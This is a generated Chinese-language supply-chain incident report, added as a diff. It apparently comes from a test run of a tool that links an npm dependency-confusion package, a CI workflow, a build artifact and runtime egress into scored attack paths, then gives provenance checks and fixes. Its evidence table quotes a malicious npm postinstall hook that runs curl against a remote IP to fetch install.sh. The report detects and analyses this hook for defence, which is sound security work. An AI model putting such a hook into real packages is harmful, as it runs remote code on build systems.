@@ -1,0 +1,373 @@
+<!doctype html>
+<html lang="zh-CN">
+<head><meta charset="utf-8"><title>SupplyGuard KG 溯源报告</title>
+<style>body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;max-width:980px;margin:40px auto;line-height:1.7;color:#0f172a}h1,h2,h3{line-height:1.3}.bullet{margin-left:1rem}code{background:#f1f5f9;padding:2px 4px;border-radius:4px}</style>
+</head><body>
+<h1>知识图谱驱动的真实攻击路径研判报告</h1>
+
+<p>生成时间：2026-06-13 16:21:09 UTC</p>
+
+<h2>风险摘要</h2>
+
+<p class="bullet">• 综合风险评分：96 / 100</p>
+<p class="bullet">• 风险等级：critical</p>
+<p class="bullet">• 打开风险：29 项，其中严重风险 13 项</p>
+<p class="bullet">• 图谱节点：91 个</p>
+<p class="bullet">• 图谱关系：292 条</p>
+<p class="bullet">• 统一资产：61 个</p>
+<p class="bullet">• 证据片段：201 条</p>
+<p class="bullet">• 运行期日志事件：574 条</p>
+<p class="bullet">• 已识别攻击路径：4 条</p>
+<p class="bullet">• 可行动攻击路径：4 条</p>
+<p class="bullet">• 高度可信真实路径：1 条</p>
+<p class="bullet">• 平均路径置信度：82%</p>
+<p class="bullet">• 路径判定分布：cross-modal-corroborated-path=1, likely-real-attack-path=1, provenance-risk-path=1, verified-provenance-chain=1</p>
+<p class="bullet">• 参考模型：GUAC 软件树/证据树可达性、OpenCTI observable 关系与置信度、NetworkX 路径评分、in-toto/SLSA 可信证据链、BloodHound 式入口到目标路径呈现</p>
+
+<h2>路径判定</h2>
+
+<p>本报告不再只列“发现了哪些漏洞”，而是判断这些证据能否串成一次真实攻击路径。</p>
+
+<h2>攻击路径</h2>
+
+<h3>1. 多模态证据印证供应链投毒到运行期异常路径</h3>
+
+<p>一句话结论：OCR/ASR 多模态证据、规则命中、依赖/构建关系和运行期日志相互印证，能串成跨模态高可信供应链攻击路径，综合置信度 91%。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;VisualEvidence: cicd-error.png&quot;]</p>
+<p>  N2[&quot;MultimodalFinding: 截图或语音中出现安装脚本外联&quot;]</p>
+<p>  N3[&quot;RecognizedEntity: package:@acme/payments-helper&quot;]</p>
+<p>  N4[&quot;DependencyPackage: npm package @acme/payments-helper&quot;]</p>
+<p>  N5[&quot;CIStep: .github/workflows/desktop-release.yml&quot;]</p>
+<p>  N6[&quot;BuildArtifact: test-checkout-api.tar.gz&quot;]</p>
+<p>  N7[&quot;RuntimeService: checkout-api.prod&quot;]</p>
+<p>  N8[&quot;LogEvent: egress&quot;]</p>
+<p>  N9[&quot;AttackStage: 供应链投毒阶段&quot;]</p>
+<p>  N1 --&gt;|触发规则| N2</p>
+<p>  N2 --&gt;|关联实体| N3</p>
+<p>  N3 --&gt;|关联依赖包| N4</p>
+<p>  N4 --&gt;|可进入构建| N5</p>
+<p>  N5 --&gt;|生成产物| N6</p>
+<p>  N6 --&gt;|deployed as| N7</p>
+<p>  N7 --&gt;|产生日志| N8</p>
+<p>  N8 --&gt;|关联| N9</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：cross-modal-corroborated-path</p>
+<p class="bullet">• 综合置信度：91%</p>
+<p class="bullet">• 严重级别：critical</p>
+<p class="bullet">• 路径评分：100 / 100</p>
+<p class="bullet">• 影响资产：cicd-error.png -&gt; package:@acme/payments-helper -&gt; npm package @acme/payments-helper -&gt; .github/workflows/desktop-release.yml -&gt; test-checkout-api.tar.gz -&gt; checkout-api.prod -&gt; egress</p>
+<p class="bullet">• 修复优先级：P0</p>
+<p class="bullet">• 攻击映射：software/evidence tree correlation, observable confidence and relationship graph, path scoring and source diversity</p>
+<p class="bullet">• 参考模型：GUAC, OpenCTI, NetworkX, Sigma, Wazuh</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• cicd-error.png --触发规则--&gt; 截图或语音中出现安装脚本外联（Sigma/Wazuh，置信度 90%）：Sigma-style multimodal rule matched recognized text from this evidence source.</p>
+<p class="bullet">• 截图或语音中出现安装脚本外联 --影响资产--&gt; package:@acme/payments-helper（FINDING_AFFECTS，置信度 86%）：Finding references the normalized asset by asset_id.</p>
+<p class="bullet">• package:@acme/payments-helper --关联依赖包--&gt; npm package @acme/payments-helper（GUAC，置信度 88%）：GUAC-style package observable matches an SBOM dependency component.</p>
+<p class="bullet">• npm package @acme/payments-helper --可进入构建--&gt; .github/workflows/desktop-release.yml（GUAC，置信度 72%）：A poisoned dependency can run install-time behavior or influence generated artifacts.</p>
+<p class="bullet">• .github/workflows/desktop-release.yml --生成产物--&gt; test-checkout-api.tar.gz（SLSA/in-toto，置信度 78%）：A compromised step or builder can produce a modified artifact.</p>
+<p class="bullet">• test-checkout-api.tar.gz --deployed as--&gt; checkout-api.prod（Runtime deployment，置信度 82%）：Workspace runtime metadata links the verified artifact to the deployed service.</p>
+<p class="bullet">• checkout-api.prod --产生日志--&gt; egress（Runtime evidence，置信度 84%）：Runtime logs show whether the build-time risk manifested after deployment.</p>
+<p class="bullet">• egress --关联--&gt; 供应链投毒阶段（evidence，置信度 50%）：NormalizedLogEvent</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• GUAC：软件树中存在可达依赖节点；主体=npm package @acme/payments-helper；状态=observed</p>
+<p class="bullet">• in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=test-checkout-api.tar.gz；状态=observed</p>
+<p class="bullet">• Runtime evidence：运行期行为证明风险可能已经触发；主体=egress；状态=observed</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 当前路径未发现明显证据缺口。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• npm package @acme/payments-helper：固定私有源、锁定版本并清理缓存包。</p>
+<p class="bullet">• .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。</p>
+<p class="bullet">• test-checkout-api.tar.gz：重新构建并校验产物哈希/provenance。</p>
+<p class="bullet">• checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。</p>
+<p class="bullet">• egress：封禁相关来源/目的地址并扩大同时间窗排查。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：test-checkout-api.tar.gz sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025; repo=https://github...</p>
+<p class="bullet">• artifact_digest_matches_subject：pass: artifact sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025 matches attestation subject</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：fail: attestation age 264.33 hours exceeds policy max_age_hours=24</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main</p>
+
+<h3>2. 证据可串成供应链投毒到运行期异常的攻击路径</h3>
+
+<p>一句话结论：能串成一次高度可信的真实攻击路径：入口、构建、产物、运行期行为连续可达，综合置信度 83%。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;DependencyPackage: npm package @acme/payments-helper&quot;]</p>
+<p>  N2[&quot;CIStep: .github/workflows/desktop-release.yml&quot;]</p>
+<p>  N3[&quot;BuildArtifact: test-checkout-api.tar.gz&quot;]</p>
+<p>  N4[&quot;RuntimeService: checkout-api.prod&quot;]</p>
+<p>  N5[&quot;LogEvent: egress&quot;]</p>
+<p>  N6[&quot;AttackStage: 供应链投毒阶段&quot;]</p>
+<p>  N1 --&gt;|可进入构建| N2</p>
+<p>  N2 --&gt;|生成产物| N3</p>
+<p>  N3 --&gt;|deployed as| N4</p>
+<p>  N4 --&gt;|产生日志| N5</p>
+<p>  N5 --&gt;|关联| N6</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：likely-real-attack-path</p>
+<p class="bullet">• 综合置信度：83%</p>
+<p class="bullet">• 严重级别：critical</p>
+<p class="bullet">• 路径评分：100 / 100</p>
+<p class="bullet">• 影响资产：npm package @acme/payments-helper -&gt; .github/workflows/desktop-release.yml -&gt; test-checkout-api.tar.gz -&gt; checkout-api.prod -&gt; egress</p>
+<p class="bullet">• 修复优先级：P0</p>
+<p class="bullet">• 攻击映射：T1195</p>
+<p class="bullet">• 参考模型：GUAC, SLSA, in-toto, BloodHound CE, MITRE ATT&amp;CK STIX</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• npm package @acme/payments-helper --可进入构建--&gt; .github/workflows/desktop-release.yml（GUAC，置信度 72%）：A poisoned dependency can run install-time behavior or influence generated artifacts.</p>
+<p class="bullet">• .github/workflows/desktop-release.yml --生成产物--&gt; test-checkout-api.tar.gz（SLSA/in-toto，置信度 78%）：A compromised step or builder can produce a modified artifact.</p>
+<p class="bullet">• test-checkout-api.tar.gz --deployed as--&gt; checkout-api.prod（Runtime deployment，置信度 82%）：Workspace runtime metadata links the verified artifact to the deployed service.</p>
+<p class="bullet">• checkout-api.prod --产生日志--&gt; egress（Runtime evidence，置信度 84%）：Runtime logs show whether the build-time risk manifested after deployment.</p>
+<p class="bullet">• egress --关联--&gt; 供应链投毒阶段（evidence，置信度 50%）：NormalizedLogEvent</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• GUAC：软件树中存在可达依赖节点；主体=npm package @acme/payments-helper；状态=observed</p>
+<p class="bullet">• in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=test-checkout-api.tar.gz；状态=observed</p>
+<p class="bullet">• Runtime evidence：运行期行为证明风险可能已经触发；主体=egress；状态=observed</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 当前路径未发现明显证据缺口。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• npm package @acme/payments-helper：固定私有源、锁定版本并清理缓存包。</p>
+<p class="bullet">• .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。</p>
+<p class="bullet">• test-checkout-api.tar.gz：重新构建并校验产物哈希/provenance。</p>
+<p class="bullet">• checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。</p>
+<p class="bullet">• egress：封禁相关来源/目的地址并扩大同时间窗排查。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：test-checkout-api.tar.gz sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025; repo=https://github...</p>
+<p class="bullet">• artifact_digest_matches_subject：pass: artifact sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025 matches attestation subject</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：fail: attestation age 264.33 hours exceeds policy max_age_hours=24</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main</p>
+
+<h3>3. 证据可串成构建链路完整性受损路径</h3>
+
+<p>一句话结论：能串成构建完整性风险路径，但还需要 provenance/attestation 才能证明产物确被篡改，综合置信度 68%。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;CIStep: .github/workflows/desktop-release.yml&quot;]</p>
+<p>  N2[&quot;BuildArtifact: test-checkout-api.tar.gz&quot;]</p>
+<p>  N3[&quot;RuntimeService: checkout-api.prod&quot;]</p>
+<p>  N4[&quot;AttackStage: 构建链路风险阶段&quot;]</p>
+<p>  N1 --&gt;|deployed as| N2</p>
+<p>  N2 --&gt;|deployed as| N3</p>
+<p>  N3 --&gt;|关联| N4</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：provenance-risk-path</p>
+<p class="bullet">• 综合置信度：68%</p>
+<p class="bullet">• 严重级别：high</p>
+<p class="bullet">• 路径评分：95 / 100</p>
+<p class="bullet">• 影响资产：.github/workflows/desktop-release.yml -&gt; test-checkout-api.tar.gz -&gt; checkout-api.prod</p>
+<p class="bullet">• 修复优先级：P1</p>
+<p class="bullet">• 攻击映射：Build provenance and integrity</p>
+<p class="bullet">• 参考模型：SLSA, in-toto, GUAC, BloodHound CE</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• .github/workflows/desktop-release.yml --关联--&gt; test-checkout-api.tar.gz（evidence，置信度 50%）：WorkspaceSummary</p>
+<p class="bullet">• test-checkout-api.tar.gz --deployed as--&gt; checkout-api.prod（Runtime deployment，置信度 82%）：Workspace runtime metadata links the verified artifact to the deployed service.</p>
+<p class="bullet">• checkout-api.prod --关联--&gt; 构建链路风险阶段（evidence，置信度 50%）：Runtime</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• in-toto：构建步骤将 material 转换为 product；主体=.github/workflows/desktop-release.yml；状态=needs-attestation</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=test-checkout-api.tar.gz；状态=observed</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 路径关系可达，但部分边是启发式关联；建议补充时间线、产物哈希或来源 IP 证据。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• .github/workflows/desktop-release.yml：收敛权限、固定 Action 到 commit SHA，并使用干净 runner。</p>
+<p class="bullet">• test-checkout-api.tar.gz：重新构建并校验产物哈希/provenance。</p>
+<p class="bullet">• checkout-api.prod：回滚或隔离服务实例，保留日志和镜像证据。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：test-checkout-api.tar.gz sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025; repo=https://github...</p>
+<p class="bullet">• artifact_digest_matches_subject：pass: artifact sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025 matches attestation subject</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：fail: attestation age 264.33 hours exceeds policy max_age_hours=24</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main</p>
+
+<h3>4. 产物可信链路验证路径</h3>
+
+<p>一句话结论：产物 test-checkout-api.tar.gz 已串联 commit e3e9f7c03ce502642fa9bc9e2c35764c92354c9b -&gt; .github/workflows/release.yml -&gt; https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main -&gt; artifact -&gt; attestation，当前未发现阻断项。</p>
+
+<p>```mermaid</p>
+<p>flowchart LR</p>
+<p>  N1[&quot;SourceCommit: commit e3e9f7c03ce502642fa9bc9e2c35764c92354c9b&quot;]</p>
+<p>  N2[&quot;Workflow: .github/workflows/release.yml&quot;]</p>
+<p>  N3[&quot;TrustedBuilder: https://github.com/HEIBAI198/Security/.github/workflows/release.&quot;]</p>
+<p>  N4[&quot;BuildArtifact: test-checkout-api.tar.gz&quot;]</p>
+<p>  N5[&quot;Attestation: checkout-api.tar.gz&quot;]</p>
+<p>  N1 --&gt;|triggers workflow| N2</p>
+<p>  N2 --&gt;|runs on| N3</p>
+<p>  N3 --&gt;|produces artifact| N4</p>
+<p>  N4 --&gt;|attested by| N5</p>
+<p>```</p>
+
+<p class="bullet">• 路径判定：verified-provenance-chain</p>
+<p class="bullet">• 综合置信度：88%</p>
+<p class="bullet">• 严重级别：low</p>
+<p class="bullet">• 路径评分：88 / 100</p>
+<p class="bullet">• 影响资产：commit e3e9f7c03ce502642fa9bc9e2c35764c92354c9b -&gt; .github/workflows/release.yml -&gt; https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main -&gt; test-checkout-api.tar.gz -&gt; checkout-api.tar.gz</p>
+<p class="bullet">• 修复优先级：P1</p>
+<p class="bullet">• 攻击映射：Verify artifact provenance</p>
+<p class="bullet">• 参考模型：SLSA, in-toto, Sigstore Cosign, GitHub Artifact Attestations, GUAC</p>
+
+<p>路径步骤：</p>
+<p class="bullet">• commit e3e9f7c03ce502642fa9bc9e2c35764c92354c9b --triggers workflow--&gt; .github/workflows/release.yml（SLSA materials，置信度 90%）：Provenance binds the source repository commit/ref to the release workflow invocation.</p>
+<p class="bullet">• .github/workflows/release.yml --runs on--&gt; https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main（SLSA builder identity，置信度 90%）：Provenance runDetails links the allowed workflow to the trusted builder identity.</p>
+<p class="bullet">• https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main --produces artifact--&gt; test-checkout-api.tar.gz（SLSA provenance，置信度 88%）：Trusted builder identity is the execution root that produced the artifact subject digest.</p>
+<p class="bullet">• test-checkout-api.tar.gz --attested by--&gt; checkout-api.tar.gz（SLSA/in-toto，置信度 92%）：Artifact trust scan parsed a provenance attestation for this artifact digest.</p>
+
+<p>可信证据链：</p>
+<p class="bullet">• SLSA materials：source repository and commit/ref are claimed by provenance；主体=commit e3e9f7c03ce502642fa9bc9e2c35764c92354c9b；状态=observed</p>
+<p class="bullet">• -：-；主体=-；状态=-</p>
+<p class="bullet">• -：-；主体=-；状态=-</p>
+<p class="bullet">• SLSA：产物需要 subject digest、builder identity 和 materials provenance；主体=test-checkout-api.tar.gz；状态=observed</p>
+<p class="bullet">• -：-；主体=-；状态=-</p>
+
+<p>证据缺口：</p>
+<p class="bullet">• 当前产物可信链未发现失败项；可继续补充 gh/cosign 在线验签记录和历史 hash 基线。</p>
+
+<p>关键封堵点：</p>
+<p class="bullet">• test-checkout-api.tar.gz：重新构建并校验产物哈希/provenance。</p>
+
+<p>证据摘要：</p>
+<p class="bullet">• Artifact provenance attestation：test-checkout-api.tar.gz sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025; repo=https://github...</p>
+<p class="bullet">• artifact_digest_matches_subject：pass: artifact sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025 matches attestation subject</p>
+<p class="bullet">• artifact_hash_baseline：skipped: No historical hash baseline configured.</p>
+<p class="bullet">• attestation_max_age：fail: attestation age 264.33 hours exceeds policy max_age_hours=24</p>
+<p class="bullet">• builder_trusted：pass: https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main</p>
+
+<h2>关联高危问题</h2>
+
+<p>| 编号 | 等级 | 评分 | 风险 | 影响资产 | 来源 |</p>
+<p>| --- | --- | ---: | --- | --- | --- |</p>
+<p>| finding-node:f13369fcf0078521 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:97aaa1dda7db9b21 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:fae7ec87f56d1cf1 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:88ab8ea49348d9fb | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:a1f8b27b61a1bf27 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:6cf793b6b25b0dee | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:1c20f675a47230f0 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:617c55daecfc1f62 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:b02fba9c9a6ec6ce | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:924b35866c71f9f8 | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:199b40c53d3c4edf | critical | 96 | 截图或语音中出现安装脚本外联 | multimodal_audit | Sigma-style YAML rule |</p>
+<p>| finding-node:075ce42d7c6ab147 | critical | 96 | 疑似依赖混淆包在构建阶段执行安装脚本 | 供应链 | WorkspaceSummary |</p>
+
+<h2>证据链</h2>
+
+<p>| 序号 | 时间 | 证据类型 | 关联资产 | 证据摘要 | 来源模型 |</p>
+<p>| ---: | --- | --- | --- | --- | --- |</p>
+<p>| 1 | 2026-06-13 16:20 | artifact-provenance | test-checkout-api.tar.gz | test-checkout-api.tar.gz sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025; repo=https://github.com/HEIBAI198/Security; commit=e3e9f7c03ce502642fa9bc9e2c35... | SLSA/in-toto |</p>
+<p>| 2 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: artifact sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025 matches attestation subject | SLSA/in-toto |</p>
+<p>| 3 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | skipped: No historical hash baseline configured. | SLSA/in-toto |</p>
+<p>| 4 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | fail: attestation age 264.33 hours exceeds policy max_age_hours=24 | SLSA/in-toto |</p>
+<p>| 5 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: https://github.com/HEIBAI198/Security/.github/workflows/release.yml@refs/heads/main | SLSA/in-toto |</p>
+<p>| 6 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: e3e9f7c03ce502642fa9bc9e2c35764c92354c9b | SLSA/in-toto |</p>
+<p>| 7 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: https://slsa.dev/provenance/v1 | SLSA/in-toto |</p>
+<p>| 8 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: github-hosted | SLSA/in-toto |</p>
+<p>| 9 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: gh attestation verify completed successfully. | SLSA/in-toto |</p>
+<p>| 10 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: https://github.com/HEIBAI198/Security | SLSA/in-toto |</p>
+<p>| 11 | 2026-06-13 16:20 | artifact-trust-check | test-checkout-api.tar.gz | pass: .github/workflows/release.yml | SLSA/in-toto |</p>
+<p>| 12 | 2026-06-13 16:20 | artifact-trust-finding | test-checkout-api.tar.gz | attestation age 264.33 hours exceeds policy max_age_hours=24 | SLSA/in-toto |</p>
+<p>| 13 | 2026-06-13 16:14 | workflow-risk-finding | .github/workflows/desktop-release.yml | permissions: write-all 会给 GITHUB_TOKEN 授予全部写权限，扩大凭据泄露或工作流劫持后的影响面。 Evidence: permissions: write-all | SARIF |</p>
+<p>| 14 | 2026-06-03T07:53:45 | multimodal-evidence-source | cicd-error.png | MME-20260603075345873115-DDC20BBF stored at storage/multimodal/MME-20260603075345873115-DDC20BBF-image-cicd-error.png | ASR/OCR + Sigma-style rules |</p>
+<p>| 15 | 2026-06-03T07:53:59 | multimodal-rule-match | cicd-error.png | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.9.2... | Sigma-style YAML rule |</p>
+<p>| 16 | 2026-06-03T08:00:52 | recognized-security-entity | package:@acme/payments-helper | pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9. | Regex/Keyword Entity Extraction |</p>
+<p>| 17 | 2026-06-03T07:53:45 | recognized-security-entity | package:@acme/payments-helper | pm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9. | Regex/Keyword Entity Extraction |</p>
+<p>| 18 | 2026-06-03T07:53:59 | visual_ocr | cicd-error.png | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/payments-helper r from public registry @acme/payments-helper@9.9.2... | PaddleOCR/PP-OCRv5 |</p>
+
+<h2>多模态证据融合</h2>
+
+<p class="bullet">• 多模态证据：18 条</p>
+<p class="bullet">• 安全实体：118 个</p>
+<p class="bullet">• 规则命中：22 条</p>
+<p class="bullet">• 多模态风险：critical / 96</p>
+<p class="bullet">• 参考模型：GUAC 负责软件供应链可达关系，OpenCTI 负责 observable/置信度/first seen 语义，NetworkX 负责路径评分和多源证据连通性。</p>
+
+<p>| Evidence ID | 类型 | 风险 | 关联实体 | 命中规则 | 识别文本摘要 |</p>
+<p>| --- | --- | --- | --- | --- | --- |</p>
+<p>| MME-20260611120040129581-DDC20BBF | image | low / 0 | - | - | - |</p>
+<p>| MME-20260605112212515224-D40CCA7A | image | critical / 96 | @acme/payments-helper@9.9.2, postinstall, curl, 185.199.108.153, 凌晨三点, checkout-api, 异常外联, 外联 | multimodal-postinstall-egress, multimodal-sensitive-interface-anomaly | npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，... |</p>
+<p>| MME-20260605112203250782-DDC20BBF | image | low / 0 | - | - | - |</p>
+<p>| MME-20260603143717219602-DDC20BBF | image | low / 0 | - | - | - |</p>
+<p>| MME-20260603080139438792-D40CCA7A | image | critical / 96 | @acme/payments-helper@9.9.2, postinstall, curl, 185.199.108.153, 凌晨三点, checkout-api, 异常外联, 外联 | multimodal-postinstall-egress, multimodal-sensitive-interface-anomaly | npm install @acme/payments-helper@9.9.2 postinstall: curl http://185.199.108.153/install.sh 凌晨三点 checkout-api 出现异常外联，... |</p>
+<p>| MME-20260603080102092971-B4A4919E | image | high / 84 | 凌晨三点, checkout-api, 异常外联, 外联, 185.199.108.153, admin/export | multimodal-sensitive-interface-anomaly | SupplyGuard Incident Screenshot 高风险告警 时间 凌晨三点 服务 checkout-api 事件 出现异常外联 目标 185.199.108.153/install.sh 接口 admin/export... |</p>
+<p>| MME-20260603080052880859-DDC20BBF | image | critical / 96 | 09:42:10, @acme/payments-helper@9.9.2, @acme/payments-helper, postinstall, curl, bash, 185.199.108.153 | multimodal-postinstall-egress | GitHub Actions / deploy-prod-2481 [09:42:10] Run npm ci npm install @acme/payments-helper@9.9.2 resolved @acme/paymen... |</p>
+<p>| MME-20260603080050377411-4A1F3B72 | audio | low / 0 | - | - | 凌晨3. 赤烤雷批爱出现一场外连 atmean export 接口访问两声高 请隔离购劲产务 并负合 provenance |</p>
+
+<h2>修复建议</h2>
+
+<p class="bullet">• **P0 · 多模态证据印证供应链投毒到运行期异常路径**：优先封堵 OCR/ASR 中识别到的依赖包、外联 IP 和敏感接口，并把同时间窗的 CI/CD、SBOM、运行日志作为取证材料保留。</p>
+<p class="bullet">• **P0 · 证据可串成供应链投毒到运行期异常的攻击路径**：隔离高危依赖，使用干净 runner 重新构建，校验产物哈希，并排查运行期外联。</p>
+<p class="bullet">• **P1 · 证据可串成构建链路完整性受损路径**：收敛 workflow 权限，第三方 Action 固定到 commit SHA，并为产物增加 provenance/attestation。</p>
+<p class="bullet">• **P2 · 产物可信链路验证路径**：将该产物可信验证结果作为发布门禁；digest、签名、builder、workflow 或来源任一失败时阻断发布。</p>
+
+<h2>附录</h2>
+
+<h3>SBOM / Dependency-Track 风险摘要</h3>
+
+<p class="bullet">• SBOM 组件数量：0</p>
+<p class="bullet">• 依赖风险数量：0</p>
+<p class="bullet">• 最高依赖风险：0 / 100</p>
+<p class="bullet">• VEX statement：0</p>
+<p class="bullet">• VEX affected / under investigation：0</p>
+<p class="bullet">• VEX not affected / fixed：0</p>
+<p class="bullet">• 代码可达依赖：0</p>
+<p class="bullet">• 运行期日志命中：0</p>
+
+<h3>SARIF / DefectDojo 风险摘要</h3>
+
+<p class="bullet">• SARIF 结果数量：6</p>
+<p class="bullet">• 代码风险数量：0</p>
+<p class="bullet">• CI/CD 风险数量：6</p>
+
+<h3>产物可信验证摘要</h3>
+
+<p class="bullet">• 产物：test-checkout-api.tar.gz</p>
+<p class="bullet">• SHA256：sha256:50e0f002fba51e6749dcbde16cec2bd9abfc36fa939821194a8e19b401b40025</p>
+<p class="bullet">• 可信评分：88 / 100</p>
+<p class="bullet">• 检查项数量：10</p>
+<p class="bullet">• 产物可信风险：1</p>
+
+<h3>日志证据摘要</h3>
+
+<p class="bullet">• 日志风险数量：0</p>
+<p class="bullet">• 图谱证据数量：201</p>
+
+<h3>开源参考</h3>
+
+<p class="bullet">• GUAC: https://docs.guac.sh/guac/</p>
+<p class="bullet">• GUAC Ontology: https://docs.guac.sh/guac/guac-ontology/</p>
+<p class="bullet">• MITRE ATT&amp;CK STIX Data: https://github.com/mitre-attack/attack-stix-data</p>
+<p class="bullet">• SLSA: https://slsa.dev/spec/v1.2/provenance</p>
+<p class="bullet">• in-toto: https://github.com/in-toto/in-toto</p>
+<p class="bullet">• BloodHound CE: https://specterops.io/bloodhound-community-edition/</p>
+<p class="bullet">• NetworkX: https://networkx.org/</p>
+<p class="bullet">• React Flow: https://reactflow.dev/</p>
+<p class="bullet">• CycloneDX: https://cyclonedx.org/specification/overview/</p>
+<p class="bullet">• SARIF: https://www.oasis-open.org/standard/sarif-v2-1-0/</p>
+<p class="bullet">• OWASP Dependency-Track: https://dependencytrack.org/</p>
+<p class="bullet">• DefectDojo: https://docs.defectdojo.com/</p>
+<p class="bullet">• FFmpeg: https://www.ffmpeg.org/index.html</p>
+<p class="bullet">• OpenCV: https://opencv.org/about/</p>
+
+</body></html>
